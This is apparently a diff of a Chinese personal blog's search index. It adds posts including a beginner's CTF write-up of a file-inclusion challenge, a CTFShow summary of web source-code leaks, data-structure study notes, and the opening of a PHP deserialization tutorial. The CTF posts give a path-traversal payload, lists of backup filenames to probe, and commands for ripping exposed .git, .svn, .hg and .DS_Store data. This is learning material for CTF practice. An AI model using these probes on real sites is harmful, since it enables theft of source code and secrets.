+<img src="/2022/03/20/Apollo/image-20220318211754595-165123726632718.png" alt="image-20220318211754595" style="zoom:50%;">
+
+<p>等到图跑结束后进到服务器那个终端，按<code>Ctrl+C</code>结束运行，并执行 <code>bash kill.sh</code> 彻底杀死进程。</p>
+<img src="/2022/03/20/Apollo/image-20220318211856078-165123726632719.png" alt="image-20220318211856078" style="zoom:67%;">
+
+<p>然后在adf-sample-agent-java文件夹中用Ctrl+C结束智能体的挂载，结束后的两个终端如下图所示：</p>
+<img src="/2022/03/20/Apollo/image-20220318211925792-165123726632720.png" alt="image-20220318211925792" style="zoom:67%;">
+
+<p>到此结束！</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>技术学习</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DASCTF 《Ezfileinclude》 wp</title>
+    <url>/2020/07/25/DASCTF/</url>
+    <content><![CDATA[<p>今天第一次参加CTF比赛，对于我这个菜鸡来说，简直毫无比赛体验<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8">😢</span><span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8">😢</span>，遭受了五个小时的吊打。</p>
+<p><img src="/2020/07/25/DASCTF/image-20200725170156404.png" alt="image-20200725170156404"></p>
+<p>没错，就是这么残忍。直接把我0封了。<img src="/2020/07/25/DASCTF/image-20200725180746269.png" alt="image-20200725180746269"></p>
+<img src="/2020/07/25/DASCTF/image-20200725180804349.png" alt="image-20200725180804349" style="zoom:67%;">
+
+<p>后来在大佬的反复提示帮助之下，勉强解出第一题《Ezfileinclude》,下面记录一下自己的挨打历程。</p>
+<p>打开靶机，页面显示的是一张图片<img src="/2020/07/25/DASCTF/image-20200725180822011.png" alt="image-20200725180822011" style="zoom:67%;"></p>
+<p>查看源码，没太多有用的信息，唯一比较特殊的话是这找图片的url:<code>**image.php?t=1595643210&amp;f=Z3F5LmpwZw==**</code></p>
+<p>看到f=后面那一串东西，一下子想到了base64编码，尝试解一波码，解出来<code>gqy.jpg</code>，先留着，说不定有用。</p>
+<p>试了一下image.php,回显：<strong>you miss some parameters</strong>（你漏掉了一些参数）奥，可能后面的t,f也得跟着，复制粘贴上去，再回车，页面回显：<strong>what’s your time ?</strong></p>
+<p>作为一个萌新，我一度怀疑这是不是什么CTF黑话，特意百度了一波 <em><strong>CTF what’s your time?</strong></em>  好吧，并不是，想了想，可能是要给time这个参数赋值，盲猜可能是URL中的t参数，试着把t参数删掉，回车，回显提醒漏掉参数，给t赋值为time试试？还是问我时间！<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f629.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f629.png?v8">😩</span>但是时间一直是变化的呀，，，怎么搞呢？关键在于那个t后面的一串数字是啥，我又去百度了一波CTF中的数字编码，没啥结果。卡住。</p>
+<p>求助大佬（emmm，应该不算犯规吧）大佬说那一串数字是<strong>unix时间戳</strong>，百度了一波，相当于那一串数字其实表示的是一个时间</p>
+<img src="/2020/07/25/DASCTF/image-20200725172909110.png" alt="image-20200725172909110" style="zoom:67%;">
+
+<p>还是那个问题，该怎么传当前时间？？？当前时间一直在变化的呀。</p>
+<p>此处贴出大佬的方法：</p>
+<img src="/2020/07/25/DASCTF/image-20200725173059630.png" alt="image-20200725173059630" style="zoom:80%;">
+
+<p>python脚本，，，好吧，我是靠<code>.py</code>这个后缀猜的<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f630.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f630.png?v8">😰</span></p>
+<p>菜鸡的我再次流下了伤心的类水，咱也不会写python脚本呀（一打开我满是灰尘的pycharm还出错了，大家还是支持正版吧<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f602.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f602.png?v8">😂</span>）</p>
+<p>不会脚本，只能靠手速了，按照大佬的指导，先转换一个10秒后的时间戳。等到时候再发（妙啊）</p>
+<p>一顿操作猛如虎，以为flag呼之欲出了，结果出来的是一堆乱码，淦！</p>
+<img src="/2020/07/25/DASCTF/image-20200725173839845.png" alt="image-20200725173839845" style="zoom:50%;">
+
+<p>搞了半天居然没用。。。</p>
+<p>后来大佬提示我去看看攻防世界 warmup 这道题的wp,<strong>目录穿越，flag在根目录</strong>，去找了一波wp学习了一下，感觉两个题的确蛮像的，不过那个题源码有提示，这个题看不了源码。我模仿那道题的wp试了试 <code>?file=index.php?/../../../../../../flag</code>不行，又试了试它的各种变形体，失败。我感觉应该没啥问题呀（<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/2b05.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/2b05.png?v8">⬅</span>菜鸡的蜜汁自信）</p>
+<p>去问大佬这个姿势错在哪,大佬说不是file=而是f=,我照做了，吧上面那个payload里的file改成了f,还是不行呀。</p>
+<p>再次寻求help,大佬让我看看时间对不对，一惊，<strong>还得用时间？</strong> （不是说没卵用的吗，，手动狗头，，）</p>
+<p>原来每次都必须t=当前时间戳&amp;f=xxx(这边就解释了为啥是f而不是file了，我还是后来才醒悟)  好吧好吧，先去转换一个20秒后的时间戳，打开手机读秒，我感觉到了胜利的曙光<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f601.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f601.png?v8">😁</span></p>
+<p>一回车，妈耶，还是不行呀，奥，那个f=xxx，xxx应该像他原来url里那样用base64编一下码的，害，这脑子。去在线编码网站把<code>index.php?/../../../../../../flag</code> base64编码一下，编码完发现它居然后面没有两个==, 我不会又被在线编码网站给制裁了吧？<img src="/2020/07/25/DASCTF/image-20200725180857115.png" alt="image-20200725180857115">将信将疑地将它复制过去，又开始手动传时间（卑微.jpg），居然成功得到了flag!</p>
+<p>一波三折，跌宕起伏，柳暗花明。</p>
+<hr>
+<p><strong>参赛体验：</strong></p>
+<p>1.有机会一定学习一下python脚本，手速传时间实在是卑微</p>
+<p>2.多刷题！多刷题！多刷题！多涨涨见识才能触类旁通</p>
+<p>第一次参赛，纪念一下吧<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f602.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f602.png?v8">😂</span></p>
+<p><img src="/2020/07/25/DASCTF/image-20200725181614351.png" alt="image-20200725181614351"></p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CTFShow刷题小结(信息搜集)</title>
+    <url>/2020/10/15/CTFShow%E5%88%B7%E9%A2%98%E5%B0%8F%E7%BB%93(%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86)/</url>
+    <content><![CDATA[<p>划了好久的水了，恰巧最近空余时间还算多，就开始刷CTFshow 上的web入门</p>
+<span id="more"></span>
+
+<h3 id="web源码泄露"><a href="#web源码泄露" class="headerlink" title="web源码泄露"></a>web源码泄露</h3><p>印象比较深的是源码泄露的几道题，之前偶尔碰到过，今天才知道是源码泄露。</p>
+<p>搬运自：<a href="https://blog.csdn.net/Fly_hps/article/details/82821857?utm_source=blogxgwz7">https://blog.csdn.net/Fly_hps/article/details/82821857?utm_source=blogxgwz7</a></p>
+<h4 id="vim临时文件"><a href="#vim临时文件" class="headerlink" title="vim临时文件"></a>vim临时文件</h4><p> 程序员使用vim编辑器编写一个<code>index.php</code>文件时，会有一个<code>.index.php.swp</code>文件，如果文件正常退出，则该文件被删除，如果异常退出，该文件则会保存下来，该文件可以用来恢复异常退出的index.php，同时多次意外退出并不会覆盖旧的<code>.swp</code>文件，而是会生成一个新的，例如<code>.swo</code>文件。</p>
+<h4 id="恢复文件"><a href="#恢复文件" class="headerlink" title="恢复文件"></a>恢复文件</h4><blockquote>
+<p>vim -r 恢复的文件名<br>前提是.index.php.swp存在于该目录下</p>
+</blockquote>
+<h4 id="vim备份文件"><a href="#vim备份文件" class="headerlink" title="vim备份文件"></a>vim备份文件</h4><p>默认情况下使用Vim编程，在修改文件后系统会自动生成一个带<code>~</code>的备份文件，某些情况下可以对其下载进行查看；</p>
+<blockquote>
+<p>以 index.php 为例 第一次产生的缓存文件名为 .index.php.swp<br>第二次意外退出后，文件名为.index.php.swo<br>第三次产生的缓存文件则为 .index.php.swn<br>注意：index前有 “ . “</p>
+</blockquote>
+<p><strong>漏洞利用</strong>：直接访问.swp文件，下载回来后删掉末尾的.swp，获得源码文件。</p>
+<h4 id="PHPSTORM"><a href="#PHPSTORM" class="headerlink" title="PHPSTORM"></a>PHPSTORM</h4><p>使用phpstorm新建项目时，会生成一个<code>.idea</code>文件夹，这个文件夹有一个<code>workspace.xml</code>，访问可以得到一些信息。</p>
+<h4 id="网站备份压缩文件"><a href="#网站备份压缩文件" class="headerlink" title="网站备份压缩文件"></a>网站备份压缩文件</h4><p>在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</p>
+<p><strong>漏洞成因及危害</strong></p>
+<p>该漏洞的成因主要有以下两种：</p>
+<blockquote>
+<p>服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。<br>编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。</p>
+</blockquote>
+<p><strong>漏洞检测</strong></p>
+<p>该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。</p>
+<p><strong>常见备份压缩文件</strong></p>
+<blockquote>
+<p>.rar<br>.zip<br>.7z<br>.tar.gz<br>.bak<br>.swp<br>.txt<br>.html</p>
+</blockquote>
+<p><strong>常见备份文件后缀：</strong></p>
+<pre><code>.index.php.swp
+index.php.swp
+index.php.bak
+.index.php~
+index.php.bak_Edietplus
+index.php.~
+index.php.~1~
+index.php
+index.php~
+index.php.rar
+index.php.zip
+index.php.7z
+index.php.tar.gz
+www.zip
+www.rar
+www.zip
+www.7z
+www.tar.gz
+www.tar
+web.zip
+web.rar
+web.zip
+web.7z
+web.tar.gz
+web.tar
+wwwroot.rar
+web.rar
+</code></pre>
+<p><strong>漏洞利用</strong>：使用disearch扫描</p>
+<blockquote>
+<p>python dirsearch.py -u url -e *</p>
+</blockquote>
+<h4 id="git源码泄漏"><a href="#git源码泄漏" class="headerlink" title="git源码泄漏"></a>git源码泄漏</h4><p>git在初始化项目的时候, 会在项目的根目录(可用<code>git rev-parse --show-toplevel</code>查看)创建一个名为<code>.git</code>的隐藏文件夹, 里面包含了本地所有commit的历史记录. 如果无意间将这个目录置于WEB的路径下让用户可以访问,那么这也就泄露了几乎所有的源代码和其他其他敏感信息.</p>
+<p>该文件可以来恢复源代码</p>
+<p><strong>fuzz：</strong></p>
+<pre><code>http://url/.git/config
+</code></pre>
+<p>若存在该页面，可以看到配置信息，说明存在该漏洞</p>
+<p><strong>漏洞利用：</strong></p>
+<p>工具：<a href="https://github.com/lijiejie/GitHack">GitHack</a></p>
+<pre><code>python GitHack.py http://url/.git/
+</code></pre>
+<blockquote>
+<p>git log可以查看提交历史<br>git diff查看git提交的不同处<br>stash命令可用于临时保存和恢复修改，可跨分支<br>git stash list查看所有保存的记录列表<br>git stash pop，从 git 栈中弹出来一个文件</p>
+</blockquote>
+<p>工具：<a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p>
+<pre><code>rip-hg.pl -v -u http://url/.git
+</code></pre>
+<h4 id="hg泄露"><a href="#hg泄露" class="headerlink" title="hg泄露"></a>hg泄露</h4><p>与git类似, hg在初始化项目时, 会在项目的根目录下创建一个名为<code>.hg</code>的隐藏文件夹,里面包含了代码和分支的修改记录和开发人员的相关信息. 当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。</p>
+<pre><code>http://www.example.com/.hg/
+</code></pre>
+<p><strong>fuzz：</strong></p>
+<pre><code>http://url/.hg/
+</code></pre>
+<p><strong>漏洞利用：</strong></p>
+<p>工具：<a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p>
+<pre><code>rip-hg.pl -v -u http://url/.hg
+</code></pre>
+<h4 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h4><p>svn同样在项目根目录下会创建一个名为<code>.svn</code>的<strong>隐藏文件夹</strong>, 包含了所有分支commit信息和代码记录.</p>
+<h4 id="fuzz："><a href="#fuzz：" class="headerlink" title="fuzz："></a>fuzz：</h4><pre><code>http://url/.svn/entries
+</code></pre>
+<p><strong>漏洞利用：</strong></p>
+<p>工具：<a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p>
+<pre><code>rip-svn.pl -v -u http://www.example.com/.svn/
+</code></pre>
+<h4 id="bzr-Bazaar泄露"><a href="#bzr-Bazaar泄露" class="headerlink" title="bzr/Bazaar泄露"></a>bzr/Bazaar泄露</h4><p>bzr在初始化项目时(bzr init/init-repo), 会在项目根目录产生名为<code>.bzr</code>的<strong>隐藏目录</strong>, 同样暴露了源代码和用户信息.</p>
+<p><strong>漏洞利用：</strong></p>
+<p>工具：<a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p>
+<pre><code>rip-bzr.pl -v -u http://www.example.com/.bzr/
+</code></pre>
+<h4 id="CVS泄漏"><a href="#CVS泄漏" class="headerlink" title="CVS泄漏"></a><strong>CVS泄漏</strong></h4><p>cvs项目在初始化(cvs checkout <code>project</code>)的时候, 会在<code>project</code>目录下创建一个名为<code>CVS</code>的目录,<br>其中保存了各个文件的修改和commit记录. 通过此目录可以获取代码的历史版本. 其中两个关键文件为:<br><code>CVS/Root</code>和<code>CVS/Entries</code>, 分别记录了项目的根信息和所有文件的结构</p>
+<p><strong>fuzz</strong></p>
+<pre><code>http://url/CVS/Root 返回根信息
+http://url/CVS/Entries 返回所有文件的结构
+</code></pre>
+<p><strong>漏洞利用</strong></p>
+<p>取回源码的命令，这个命令的意思就是把远端一个名为name的repo clone到本地名为dir的目录下。</p>
+<pre><code>bk clone http://url/name dir
+</code></pre>
+<p>查看所有的改变的命令，转到download的目录</p>
+<pre><code>bk changes
+</code></pre>
+<h4 id="DS-Store文件泄漏"><a href="#DS-Store文件泄漏" class="headerlink" title=".DS_Store文件泄漏"></a>.DS_Store文件泄漏</h4><p>.DS_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。如果开发/设计人员在发布代码时未删除文件夹中隐藏的.DS_store，则有可能会造成文件泄露</p>
+<p><strong>fuzz：</strong></p>
+<pre><code>http://url/.DS_Store
+</code></pre>
+<p><strong>漏洞利用：</strong></p>
+<p>工具：<a href="https://github.com/lijiejie/ds_store_exp">dsstoreexp</a></p>
+<pre><code>python ds_store_exp.py http://url/.DS_Store
+</code></pre>
+<h4 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h4><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>
+<p>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。</p>
+<p>WEB-INF主要包含一下文件或目录：</p>
+<ul>
+<li><code>/WEB-INF/web.xml</code>：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</li>
+<li><code>/WEB-INF/classes/</code>：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</li>
+<li><code>/WEB-INF/lib/</code>：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</li>
+<li><code>/WEB-INF/src/</code>：源码目录，按照包名结构放置各个java文件。</li>
+<li><code>/WEB-INF/database.properties</code>：数据库配置文件漏洞检测以及利用方法</li>
+</ul>
+<h4 id="漏洞检测以及利用方法"><a href="#漏洞检测以及利用方法" class="headerlink" title="漏洞检测以及利用方法"></a>漏洞检测以及利用方法</h4><p>通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</p>
+<pre><code>http://url/WEB-INF/web.xml
+</code></pre>
+<h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><p><a href="https://0clickjacking0.github.io/2019/04/17/web%E5%B8%B8%E8%A7%81%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/">https://0clickjacking0.github.io/2019/04/17/web常见源码泄露/</a><br><a href="https://www.secpulse.com/archives/55286.html">https://www.secpulse.com/archives/55286.html</a><br><a href="https://www.cnblogs.com/pannengzhi/p/2017-09-23-web-file-disclosure.html">WEB中的敏感文件泄漏</a></p>
+<h3 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h3><p>web18中新接触到了一种新的编码，unicode，其特征为：\uxxxx</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>数据结构疑问</title>
+    <url>/2021/03/16/DSQuestion/</url>
+    <content><![CDATA[<p>记录《数据结构》中的一些问题</p>
+<h4 id="1-时间复杂度O-1-与O-n-的区别？"><a href="#1-时间复杂度O-1-与O-n-的区别？" class="headerlink" title="1.时间复杂度O(1)与O(n)的区别？"></a>1.时间复杂度O(1)与O(n)的区别？</h4><p><img src="/2021/03/16/DSQuestion/image-20210316215804952.png" alt="image-20210316215804952"></p>
+<p><img src="/2021/03/16/DSQuestion/image-20210316220103135.png" alt="image-20210316220103135"></p>
+<h4 id="2-随机存取"><a href="#2-随机存取" class="headerlink" title="2.随机存取"></a>2.随机存取</h4><p>根据存储位置是否可计算（是否有一个计算地址的公式）来判断该数据结构是否具备随机存取的特性，如数组知道首地址就可计算后面所有元素的地址</p>
+<h4 id="第四章-数组和特殊矩阵"><a href="#第四章-数组和特殊矩阵" class="headerlink" title="第四章  数组和特殊矩阵"></a>第四章  数组和特殊矩阵</h4><h5 id="对一个文件的压缩的内在逻辑是否就是对稀疏矩阵的压缩处理？"><a href="#对一个文件的压缩的内在逻辑是否就是对稀疏矩阵的压缩处理？" class="headerlink" title="对一个文件的压缩的内在逻辑是否就是对稀疏矩阵的压缩处理？"></a>对一个文件的压缩的内在逻辑是否就是对稀疏矩阵的压缩处理？</h5><p>文件压缩有很多种，包含了稀疏矩阵</p>
+<h5 id="为什么顺序存储的顺序表是依靠数组这个载体实现的，但是数组却不能看做线性结构的推广，对他进行插入和删除"><a href="#为什么顺序存储的顺序表是依靠数组这个载体实现的，但是数组却不能看做线性结构的推广，对他进行插入和删除" class="headerlink" title="为什么顺序存储的顺序表是依靠数组这个载体实现的，但是数组却不能看做线性结构的推广，对他进行插入和删除"></a>为什么顺序存储的顺序表是依靠数组这个载体实现的，但是数组却不能看做线性结构的推广，对他进行插入和删除</h5><p>数组是静态数据结构，本质上没有插入和删除运算</p>
+<h5 id="为什么稀疏矩阵压缩存储后，必会失去随机存取功能？"><a href="#为什么稀疏矩阵压缩存储后，必会失去随机存取功能？" class="headerlink" title="为什么稀疏矩阵压缩存储后，必会失去随机存取功能？"></a>为什么稀疏矩阵压缩存储后，必会失去随机存取功能？</h5><p>因为在这种矩阵中，非零元素的分布是没有规律的，为了压缩存储，就将每一个非零元素的值和它所在的行、列号做为一个结点存放在一起，这样的结点组成的线性表中叫三元组表，它已不是简单的向量，所以无法用下标直接存取矩阵中的元素（没有一个计算公式）。</p>
+<h5 id="动态数组是先申请一块指定大小的内存块区域，还是先申请一块未定义大小的内存区域之后再定义？"><a href="#动态数组是先申请一块指定大小的内存块区域，还是先申请一块未定义大小的内存区域之后再定义？" class="headerlink" title="动态数组是先申请一块指定大小的内存块区域，还是先申请一块未定义大小的内存区域之后再定义？"></a>动态数组是先申请一块指定大小的内存块区域，还是先申请一块未定义大小的内存区域之后再定义？</h5><p>先申请一块指定大小的内存块区域</p>
+<h5 id="动态数组是数组吗？如果是，数组是静态数据结构，那动态数组也是静态数据结构吗？"><a href="#动态数组是数组吗？如果是，数组是静态数据结构，那动态数组也是静态数据结构吗？" class="headerlink" title="动态数组是数组吗？如果是，数组是静态数据结构，那动态数组也是静态数据结构吗？"></a>动态数组是数组吗？如果是，数组是静态数据结构，那动态数组也是静态数据结构吗？</h5><img src="/2021/03/16/DSQuestion/image-20210318140952671.png" alt="image-20210318140952671" style="zoom:80%;">
+
+<p>无论是动态数组还是静态数组，数组长度确定下来后存储空间就确定了，所以静态和动态数组都是静态数据结构</p>
+<p>静态数据结构通常不会去定义插入、删除操作</p>
+<p><img src="/2021/03/16/DSQuestion/image-20210318141309092.png" alt="image-20210318141309092"></p>
+<h5 id="假如数组下标不是从0开始，而是从1开始，会影响到什么？"><a href="#假如数组下标不是从0开始，而是从1开始，会影响到什么？" class="headerlink" title="假如数组下标不是从0开始，而是从1开始，会影响到什么？"></a>假如数组下标不是从0开始，而是从1开始，会影响到什么？</h5><p>lacation计算里会出现一个-1计算</p>
+<h5 id="n和t都是未知常数，那O-n-t-复杂度和O-1-有什么区别？稀疏矩阵的快速转置算法中时间复杂度O-n-t-能不能直接写成O-n-？"><a href="#n和t都是未知常数，那O-n-t-复杂度和O-1-有什么区别？稀疏矩阵的快速转置算法中时间复杂度O-n-t-能不能直接写成O-n-？" class="headerlink" title="n和t都是未知常数，那O(n+t)复杂度和O(1)有什么区别？稀疏矩阵的快速转置算法中时间复杂度O(n+t)能不能直接写成O(n)？"></a>n和t都是未知常数，那O(n+t)复杂度和O(1)有什么区别？稀疏矩阵的快速转置算法中时间复杂度O(n+t)能不能直接写成O(n)？</h5><p>n、t都是可变的，是<strong>变量</strong>，所以不能写成O(1)，又不知道n、t哪个大，所以不能写成O(n)或者O(t).在某些情况下，如果知道n,t的大小情况的话是可以写成O(较大的那个)</p>
+<h5 id="我们学习的存储稀疏矩阵的方法是利用三元组，有没有更节省存储空间的办法或者更易进行矩阵运算的存储方式？"><a href="#我们学习的存储稀疏矩阵的方法是利用三元组，有没有更节省存储空间的办法或者更易进行矩阵运算的存储方式？" class="headerlink" title="我们学习的存储稀疏矩阵的方法是利用三元组，有没有更节省存储空间的办法或者更易进行矩阵运算的存储方式？"></a>我们学习的存储稀疏矩阵的方法是利用三元组，有没有更节省存储空间的办法或者更易进行矩阵运算的存储方式？</h5><p>更节省空间的暂无</p>
+<p>更易进行矩阵运算的有很多（分块啥的）</p>
+<h5 id="用数组存储矩阵，我们讨论了转置算法，那么对于其他的矩阵运算，比如求逆，点乘等，是否也有常用的算法？如果是用三元组存储的稀疏矩阵又要怎么进行这些矩阵运算？"><a href="#用数组存储矩阵，我们讨论了转置算法，那么对于其他的矩阵运算，比如求逆，点乘等，是否也有常用的算法？如果是用三元组存储的稀疏矩阵又要怎么进行这些矩阵运算？" class="headerlink" title="用数组存储矩阵，我们讨论了转置算法，那么对于其他的矩阵运算，比如求逆，点乘等，是否也有常用的算法？如果是用三元组存储的稀疏矩阵又要怎么进行这些矩阵运算？"></a>用数组存储矩阵，我们讨论了转置算法，那么对于其他的矩阵运算，比如求逆，点乘等，是否也有常用的算法？如果是用三元组存储的稀疏矩阵又要怎么进行这些矩阵运算？</h5><h5 id="如何实现稀疏矩阵的乘法运算，和平常的矩阵乘法运算相比，时间复杂度能否较为简单？"><a href="#如何实现稀疏矩阵的乘法运算，和平常的矩阵乘法运算相比，时间复杂度能否较为简单？" class="headerlink" title="如何实现稀疏矩阵的乘法运算，和平常的矩阵乘法运算相比，时间复杂度能否较为简单？"></a>如何实现稀疏矩阵的乘法运算，和平常的矩阵乘法运算相比，时间复杂度能否较为简单？</h5><p>可以查查matlab是怎么实现的</p>
+<h5 id="C语言中的数组的定义和数据结构中的数组是否相同？C语言中的数组有何局限性？"><a href="#C语言中的数组的定义和数据结构中的数组是否相同？C语言中的数组有何局限性？" class="headerlink" title="C语言中的数组的定义和数据结构中的数组是否相同？C语言中的数组有何局限性？"></a>C语言中的数组的定义和数据结构中的数组是否相同？C语言中的数组有何局限性？</h5><img src="/2021/03/16/DSQuestion/image-20210318140758524.png" alt="image-20210318140758524" style="zoom:80%;">
+
+<h5 id="稀疏矩阵的快速转置算法“快速”的代价是什么？"><a href="#稀疏矩阵的快速转置算法“快速”的代价是什么？" class="headerlink" title="稀疏矩阵的快速转置算法“快速”的代价是什么？"></a>稀疏矩阵的快速转置算法“快速”的代价是什么？</h5><p>存储空间增加了</p>
+<h5 id="稀疏矩阵的快速转置算法中，num和k数组的初始化都是必要的吗"><a href="#稀疏矩阵的快速转置算法中，num和k数组的初始化都是必要的吗" class="headerlink" title="稀疏矩阵的快速转置算法中，num和k数组的初始化都是必要的吗"></a>稀疏矩阵的快速转置算法中，num和k数组的初始化都是必要的吗</h5><p>按书上那么做的话是必要的</p>
+<p><img src="/2021/03/16/DSQuestion/image-20210318152228362.png" alt="image-20210318152228362"></p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>数据结构</category>
+      </categories>
+      <tags>
+        <tag>数据结构</tag>
       </tags>
   </entry>
   <entry>
@@ -1036,8 +1036,8 @@ $ git config --global --unset https.proxy
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>web</tag>
         <tag>CTF</tag>
+        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -1517,6 +1517,423 @@ int main()
       </categories>
       <tags>
         <tag>Typora</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP反序列化漏洞学习</title>
+    <url>/2020/10/28/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1/</url>
+    <content><![CDATA[<p>首先，什么是序列化？</p>
+<p><strong>序列化就是将一个对象转换成字符串。字符串包括，属性名，属性值，属性类型和该对象对应的类名。</strong><br><strong>反序列化则相反将字符串重新恢复成对象</strong></p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>过程</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>序列化</td>
+<td>对象—&gt; 字符串</td>
+</tr>
+<tr>
+<td>反序列化</td>
+<td>字符串—&gt;对象</td>
+</tr>
+</tbody></table>
+<img src="/2020/10/28/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1/1893076-20200711232303502-1979730084.png" alt="1893076-20200711232303502-1979730084.png" style="zoom:60%;">
+
+<h5 id="1-序列化函数serialize"><a href="#1-序列化函数serialize" class="headerlink" title="1.序列化函数serialize()"></a>1.序列化函数serialize()</h5><pre><code class="line-numbers language-php">&lt;?php
+    class Ctf{
+        public $flag='flag{****}';
+        public $name='cxk';
+        public $age='10';
+    }
+    $ctfer=new Ctf();     //实例化一个对象
+    $ctfer-&gt;flag='flag{adedyui}';
